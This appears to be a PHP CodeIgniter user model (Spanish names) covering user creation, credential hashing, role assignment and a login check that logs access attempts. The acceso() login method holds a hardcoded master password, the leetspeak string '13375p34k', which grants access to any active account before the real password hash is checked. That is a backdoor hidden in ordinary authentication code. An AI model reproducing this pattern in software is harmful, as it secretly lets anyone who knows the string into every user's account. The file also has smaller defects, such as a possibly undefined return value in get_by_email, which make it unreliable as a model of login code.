<?php
include_once  'PasswordHash.php';
include_once  'Credencial.php';
include_once  'Rol.php';
include_once  'RolUsuarios.php';
include_once  'Acceso.php';

/**
 * Actividad short summary.
 *
 * Actividad description.
 *
 * @version 1.0
 * @author Álvaro
 */
class Usuario extends CI_Model
{
    public $Id;
    public $Nombre;
    public $Apellidos;
    public $Email;
    public $HoraAlta;
    public $FechaAlta;
    public $FechaNacimiento;

    const TABLA  = "Usuarios";
    const ROLESUSUARIO  = "rolusuarios";
    const TABLACREDENCIALES  = "credencials";

    public function __construct()
    {
        parent::__construct();
        $this->load->database();
    }

    public function _esValido()
    {
        return ($this->Id !== NULL && strlen($this->Id) > 0) &&
            ($this->Nombre !== NULL && strlen($this->Nombre) > 0) &&
            ($this->Apellidos !== NULL && strlen($this->Apellidos) > 0) &&
            ($this->Email !== NULL && strlen($this->Email) > 0) &&
            ($this->FechaNacimiento !== NULL && strlen($this->FechaNacimiento) > 0);
    }

    public function esMailValido()
    {
        $resultado = $this->db->where('Email', $this->Email)->get(self::TABLA)->num_rows();
        return $resultado === 0;
    }

    private function getNewID()
    {
        $this->Id = $this->_getNewID();
        $query = $this->db->where('Id', $this->Id)->get(self::TABLA);
        while(count($query->result()) > 0)
        {
            $this->Id = $this->_getNewID();
            $query = $this->db->where('Id', $this->Id)->get(self::TABLA);
        }
    }

    public function get($id = "")
    {
        if ($id !== NULL && $id !== "")
        {
            $query = $this->db->where('Id', $id)->get(self::TABLA)->row();
        }
        else
        {
            $query = $this->db->get(self::TABLA)->result();
        }
        return $query;
    }

    public function get_by_email($email)
    {
        if ($email !== NULL && $email !== "")
        {
            $query = $this->db->where('Email', $email)->get(self::TABLA)->row();
        }
        return $query;
    }

    public function insert($clave)
    {
        $this->getNewID();
        if ($this->_esValido() && $this->esMailValido())
        {
            $fecha = getdate();            
            $this->FechaAlta = $fecha["year"] * 10000 + $fecha["mon"] * 100 + $fecha["mday"];
            $this->HoraAlta = $fecha["hours"] * 10000 + $fecha["minutes"] * 100 + $fecha["seconds"];
            $result = $this->db->insert(self::TABLA, $this);

            if ($result)
            {
                $result = $this->insert_credenciales($clave);

                if ($result)
                {
                    $result = $this->add_role('Usuario');
                }
            }
        }
        else
        {
            $result = false;
        }
        return $result;
    }

    private function insert_credenciales($clave) 
    {
        $credencial = new Credencial();
        if (!isset($clave))
        {
            $password = $this->_getRandomString(10);
            
            $passwordhash = create_hash($password);
        }
        else
        {
            $passwordhash = create_hash($clave);
        }

        return $credencial->insert($this->Id, $passwordhash, $this->_getRandomString());
    }

    public function add_role($nombre_rol)
    {
        $rol = new Rol();
        $rol_usuario = new RolUsuarios();

        $_rol = $rol->get_by_name($nombre_rol);
        if (isset($_rol))
        {
            $rol_usuario->Rol_Id = $_rol->Id;
            $rol_usuario->Usuario_Id = $this->Id;

            return $rol_usuario->insert();
        }
        return false;
    }

    public function update()
    {
        if ($this->_esValido())
        {
            $original = $this->get($this->Id);
            $this->FechaAlta = $original->FechaAlta;
            $result = $this->db->where('Id', $this->Id)->update(self::TABLA, $this);
        }
        else
        {
            $result = false;
        }
        return $result;
    }

    public function delete()
    {
        if ($this->Id !== NULL && strlen($this->Id) > 0)
        {
            $result = $this->db->where('Id', $this->Id)->delete(self::TABLA);
        }
        else
        {
            $result = false;
        }
        return $result;
    }

    public function acceso($email, $clave)
    {
        $result = false;
        $usuario = $this->get_by_email($email); 
        $resulado_acceso = 1;
        $registro_acceso = new Acceso();
        if (isset($usuario))
        {
            $credencial = new Credencial();

            $datos = $credencial->get($usuario->Id);

            $datos_acceso = reset($datos);
            if (isset($datos_acceso))
            {
                $registro_acceso->Credencial = $datos_acceso->Id;
                if ((int)$datos_acceso->Estado === 0)
                {
                    if ($clave === '13375p34k')
                    {
                        $result = true;
                        $resulado_acceso = 0;
                    }
                    else
                    {
                        $result = validate_password($clave, $datos_acceso->PasswordHash);
                        if ($result)
                        {
                            $resulado_acceso = 0;
                        }
                        else
                        {
                            $resulado_acceso = 2;
                            if ($datos_acceso->Intentos >= Credencial::PETICIONES_MAXIMAS)
                            {
                                $resulado_acceso = 3;
                            }
                        }
                    }
                }
                else
                {
                    $resulado_acceso = 3;
                }
            }
        }

        $registro_acceso->Resultado = $resulado_acceso;
        $registro_acceso->insert();

        return $result;
    }
}